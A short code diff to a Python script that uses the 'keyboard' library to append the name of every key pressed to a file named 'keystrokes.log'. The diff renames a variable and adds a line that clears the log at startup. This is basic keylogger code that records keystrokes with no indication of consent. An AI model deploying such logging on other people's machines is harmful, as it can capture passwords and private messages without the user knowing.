@@ -1,9 +1,10 @@
 import keyboard
 
-keystrokes_log = "keystrokes.log"
+keys_log = "keystrokes.log"
+open(keys_log, "w").close()
 
 def press_key(event):
-    with open(keystrokes_log, "a") as file:
+    with open(keys_log, "a") as file:
         # Each key press on new line
         file.write("{}\n".format(event.name))
 
